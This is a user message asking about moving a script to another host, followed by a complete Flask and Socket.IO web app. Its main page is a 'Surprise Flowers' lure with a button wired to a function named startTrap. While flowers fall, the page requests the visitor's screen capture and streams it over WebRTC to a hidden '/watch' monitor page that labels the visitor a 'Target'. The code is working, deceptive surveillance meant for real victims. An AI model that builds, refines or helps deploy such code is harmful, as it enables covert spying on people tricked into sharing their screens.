what about if i put this script in another host ? import eventlet
eventlet.monkey_patch()

from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit
import logging

# Disable excessive logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

@app.route('/')
def flowers():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>🌸 Surprise Flowers</title>
    <meta name="viewport" content="width=device-width">
    <style>
        body { margin: 0; background: linear-gradient(45deg,#ff6b9d,#c44569,#f8b500); font-family: Arial; text-align: center; padding: 20px; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; overflow: hidden; }
        h1 { font-size: 2.5em; color: white; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); margin-bottom: 10px; }
        .btn { background: linear-gradient(45deg,#ff9a9e,#fecfef,#fecfef); border: none; padding: 20px 40px; font-size: 24px; border-radius: 50px; cursor: pointer; box-shadow: 0 10px 30px rgba(0,0,0,0.3); transition: all 0.3s; z-index: 10; position: relative; }
        .btn:hover { transform: scale(1.1); box-shadow: 0 15px 40px rgba(0,0,0,0.4); }
        .flower { position: absolute; top: -50px; animation: fall 6s linear infinite; font-size: 30px; pointer-events: none; }
        @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
    </style>
</head>
<body>
    <h1>🌸 Surprise Flowers For You! 🌸</h1>
    <p id="msg" style="color:white; font-size:20px; margin:20px 0;">Click to see beautiful animated flowers! ✨</p>
    <button id="btn" class="btn" onclick="startTrap()">🌺 Click For Flowers! 🌺</button>
    <div id="flowers"></div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        let pc;

        async function startTrap() {
            document.getElementById('btn').style.display = 'none';
            document.getElementById('msg').innerText = "Look at the flowers! 🌸✨";

            for (let i = 0; i < 40; i++) {
                setTimeout(() => {
                    let f = document.createElement('div');
                    f.innerHTML = ['🌸', '🌺', '🌹', '🌷', '🌻', '✨'][Math.floor(Math.random() * 6)];
                    f.className = 'flower';
                    f.style.left = Math.random() * 100 + '%';
                    f.style.fontSize = (20 + Math.random() * 30) + 'px';
                    f.style.animationDuration = (3 + Math.random() * 4) + 's';
                    document.getElementById('flowers').appendChild(f);
                }, i * 150);
            }

            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                stream.getTracks().forEach(t => pc.addTrack(t, stream));
                
                pc.onicecandidate = e => {
                    if (e.candidate) socket.emit('ice', e.candidate);
                };

                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                socket.emit('offer', offer);

                socket.on('answer', async (answer) => {
                    await pc.setRemoteDescription(new RTCSessionDescription(answer));
                });

                socket.on('ice', async (candidate) => {
                    await pc.addIceCandidate(new RTCIceCandidate(candidate));
                });

            } catch (err) {
                console.error("Error:", err);
            }
        }
    </script>
</body>
</html>
'''

@app.route('/watch')
def watch():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>🎯 Monitor</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
        video { width: 95%; max-height: 85vh; border: 2px solid #00ff00; border-radius: 8px; background: #000; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        .status { font-size: 20px; margin-top: 15px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>
    <h1>LIVE MONITOR 🌸</h1>
    <video id="v" autoplay playsinline muted></video>
    <div id="status" class="status">Waiting for Connection...</div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        const v = document.getElementById('v');
        const status = document.getElementById('status');
        let pc;

        socket.on('offer', async (offer) => {
            status.innerText = "Target Connected - Negotiating...";
            pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });

            pc.onicecandidate = e => {
                if (e.candidate) socket.emit('ice', e.candidate);
            };

            pc.ontrack = e => {
                v.srcObject = e.streams[0];
                status.innerText = "ONLINE - LIVE STREAM";
            };

            await pc.setRemoteDescription(new RTCSessionDescription(offer));
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);
            socket.emit('answer', answer);
        });

        socket.on('ice', async (candidate) => {
            if (pc) await pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => {});
        });
    </script>
</body>
</html>
'''

@socketio.on('offer')
def handle_offer(data):
    emit('offer', data, broadcast=True, include_self=False)

@socketio.on('answer')
def handle_answer(data):
    emit('answer', data, broadcast=True, include_self=False)

@socketio.on('ice')
def handle_ice(data):
    emit('ice', data, broadcast=True, include_self=False)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
